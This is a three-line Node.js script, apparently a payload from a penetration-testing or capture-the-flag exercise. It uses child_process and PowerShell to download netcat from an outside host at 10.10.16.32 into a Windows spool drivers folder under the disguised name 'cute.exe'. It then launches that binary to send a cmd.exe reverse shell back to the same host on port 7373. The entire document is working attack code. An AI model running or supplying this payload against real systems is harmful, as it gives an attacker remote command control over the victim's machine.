const p = require("child_process");
p.exec("powershell -c iwr http://10.10.16.32:8000/nc64.exe -outf c:\\windows\\system32\\spool\\drivers\\color\\cute.exe");
p.exec("start c:\\windows\\system32\\spool\\drivers\\color\\cute.exe 10.10.16.32 7373 -e cmd.exe");